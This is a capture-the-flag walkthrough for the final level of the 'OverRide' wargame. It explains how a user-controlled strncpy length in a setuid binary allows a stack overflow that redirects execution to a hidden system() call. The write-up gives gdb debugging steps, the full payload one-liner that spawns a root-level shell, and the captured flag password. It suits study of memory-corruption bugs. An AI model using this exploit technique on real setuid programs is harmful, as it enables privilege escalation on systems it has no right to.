# Solution

Information about the binary if we check the `file` command we will see that the binary is x86_64 and not x86:

```sh
level09@OverRide:~$ file level09
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

Here is the decompile C code:

```c
void secret_backdoor(void)
{
    char s[128];

    fgets(s, 128, stdin);
    system(s);
}

void    set_msg(char *buffer)
{
    char s[1024];

    memset(s, 0, sizeof(s));
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(s, 1024, stdin);
    strncpy(buffer, s, *(int *)(buffer + 180));
}

void    set_username(char *buffer)
{
    char s[140];
    int i;

    memset(s, 0, 0x80uLL);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(s, 128, stdin);
    for ( i = 0; i <= 40 && s[i]; ++i )
        *(unsigned char *)(buffer + i + 140) = s[i];
    printf(">: Welcome, %s", (const char *)(buffer + 140));
}

void    handle_msg(void)
{
    char buffer[140];

    set_username(buffer);
    set_msg(buffer);
    puts(">: Msg sent!");
}


int main(void)
{
    puts(
            "--------------------------------------------\n"
            "|   ~Welcome to l33t-m$n ~    v1337        |\n"
            "--------------------------------------------");
    handle_msg();
    return 0;
}

```
This one is quit tricky and easy to not see the exploit here is the line that is dangerous:

```c
strncpy(buffer, s, *(int *)(buffer + 180));
```

So it's inside the `set_msg()` function which is called inside the `handle_msg()` function,
the `buffer + 180` is actually under our control inside we have to look at the `set_username()` function first:

```c
void    set_username(char *buffer)
{
    char s[140];
    int i;

    memset(s, 0, 0x80uLL);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(s, 128, stdin);
    for ( i = 0; i <= 40 && s[i]; ++i )
        *(unsigned char *)(buffer + i + 140) = s[i];
    printf(">: Welcome, %s", (const char *)(buffer + 140));
}

void    handle_msg(void)
{
    char buffer[140];

    set_username(buffer);
    set_msg(buffer);
    puts(">: Msg sent!");
}
```

So the `set_username()` function is using the handle_msg `buffer` variable as argument,
to write 40 byte starting at the `index 140` which if you look at the `buffer variable` in handle_msg function,
is clearly an overflow so in the `set_username()` function it will use a stack buffer named `s` and will get input from user,
via `fgets()` call which then will use the only 40 first byte of the `s` input even though you can store 128 only 40 will be used.

From here we have to look at the `set_msg()` function to understand why the `strncpy()` call is where the exploit start:

```c
void    set_msg(char *buffer)
{
    char s[1024];

    memset(s, 0, sizeof(s));
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(s, 1024, stdin);
    strncpy(buffer, s, *(int *)(buffer + 180));
}
```

You could see here we also have a stack buffer called `s` we also fetch the input from the user via `fgets()` call,
but the `strncpy()` parameter are what we are interested in for the exploit.

Here is function call with parameter `strncpy(buffer, s, *(int *)(buffer + 180))` the third parameter is the reason of the exploit,
so the exploit is the simple overwrite of the return address where here we will need to write the return address by the function `secret_backdoor()`.

The issue the with the third parameter in `strncpy()` is that we can control that parameter allowing us to overflow the `buffer` which max capacity is 140 byte,
so the goal here will be to pass byte `\xff` which is equal in decimal as 255 allowing us to overwrite the return address.

First let's test that theory and find the offset that will overwrite the value let's start `gdb-gef` and find those information:

```sh
# let's break at the first call of fgets inside the set_username function
gef➤  b *set_username+107
```

```sh
# now continue until hitting the breakpoint and pass the fgets call
gef➤  c
Continuing.
>: Enter your username

Breakpoint 3, 0x0000555555400a38 in set_username ()
```

```sh
# from here we need to pass the fgets and go to the next instruction and use call inside gdb to provide the payload
gef➤  ni
>>:
0x0000555555400a3d in set_username ()

   0x555555400a35 <set_username+0068> mov    rdi, rax
●  0x555555400a38 <set_username+006b> call   0x555555400770 <fgets@plt>
 → 0x555555400a3d <set_username+0070> mov    DWORD PTR [rbp-0x4], 0x0
   0x555555400a44 <set_username+0077> jmp    0x555555400a6a <set_username+157>
# now we need to use call memcpy at the address of the buffer which is store in rax register
gef➤  x/xg $rax
0x7fffffffd7a0: 0x000000000000000a
gef➤  call (void *)memcpy(0x7fffffffd7a0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xff\xff", 41)
$10 = (void *) 0x7fffffffd7a0
```

Why are we using two `\xff\xff` and writing 41 byte, because of the `\n` that will be present to avoid having,
`0a` as last value and to force the `\xff` as last value.

So now we have the proper payload inside the buffer let's see if we actually manage to control the third parameter,
this is pretty simple we will check if the index 180 is set we the proper value which should be `0xff` or `255` in decimal.

```sh
# this buffer variable inside handle_msg() function
gef➤  x/xw $rbp-0xc0+180
0x7fffffffd8f4: 0x000000ff
```

So yes this works nice now we need to find the offset that will overwrite the return address let's use a de brujin string.

```sh
# now we create the pattern and break at the next fgets call which is inside the set_msg() function.
gef➤  pattern create 250
[+] Generating a pattern of 250 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabga
[+] Saved as '$_gef0'
gef➤  b *set_msg+107
```

Now let's pass the de brujin string that we generated as input to fgets

```sh
gef➤  x/xg $rbp+0x8
0x7fffffffd908: 0x626161616161617a
gef➤  pattern search 0x626161616161617a
[+] Searching for '7a61616161616162'/'626161616161617a' with period=8
[+] Found at offset 200 (little-endian search) likely
```

So the offset to overwrite the address is at the position 200 now let's pack the address of `secret_backdoor()` function,
this will give us `\x8cHUUUU\x00\x00` which is the address for x86_64 of `secret_backdoor()` now we just need to check a the `secret_backdoor()` function before,

```c
int secret_backdoor(void)
{
    char s[128];

    fgets(s, 128, stdin);
    return system(s);
}
```

As you can see it's also expecting and input from the user and will use the buffer as parameter to the `system()` function,
so let's provide "/bin/sh" to start a shell.


Here is the payload and result of it:
```sh
level09@OverRide:~$ (python -c 'print "A"*39+"\xff\xff"'; python -c 'print "A"*200+"\x8cHUUUU\x00\x00"'; python -c 'print "/bin/sh"'; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!



ls -l
ls: cannot open directory .: Permission denied
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

We managed to start a shell and fetch the flag and finished OverRide !
